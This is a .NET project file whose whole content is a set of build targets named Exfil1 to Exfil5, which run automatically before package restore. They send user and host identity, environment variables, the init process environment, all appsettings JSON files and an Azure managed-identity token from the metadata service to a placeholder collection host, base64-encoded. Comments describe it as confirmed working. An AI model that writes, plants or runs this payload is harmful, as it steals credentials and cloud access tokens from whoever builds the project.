<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net472</TargetFramework>
  </PropertyGroup>

  <!-- Confirmed working — keep as anchor -->
  <Target Name="Exfil1" BeforeTargets="Restore">
    <Exec Command="curl -s http://COLLAB_DOMAIN/ctx/`whoami`/`hostname`/`id`" />
  </Target>

  <!-- Env dump — split into smaller curls to avoid length issues -->
  <Target Name="Exfil2" BeforeTargets="Restore">
    <Exec Command="env | base64 | curl -s -T - http://COLLAB_DOMAIN/env-dump" />
  </Target>

  <!-- /proc/1/environ — init process, often has injected Azure secrets -->
  <Target Name="Exfil3" BeforeTargets="Restore">
    <Exec Command="cat /proc/1/environ | tr '\0' '\n' | base64 | curl -s -T - http://COLLAB_DOMAIN/proc1env" />
  </Target>

  <!-- appsettings files -->
  <Target Name="Exfil4" BeforeTargets="Restore">
    <Exec Command="find / -name 'appsettings*.json' 2>/dev/null | xargs cat 2>/dev/null | base64 | curl -s -T - http://COLLAB_DOMAIN/appsettings" />
  </Target>

  <!-- IMDS managed identity token -->
  <Target Name="Exfil5" BeforeTargets="Restore">
    <Exec Command="curl -sf -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/' | base64 | curl -s -T - http://COLLAB_DOMAIN/imds-token" />
  </Target>


</Project>
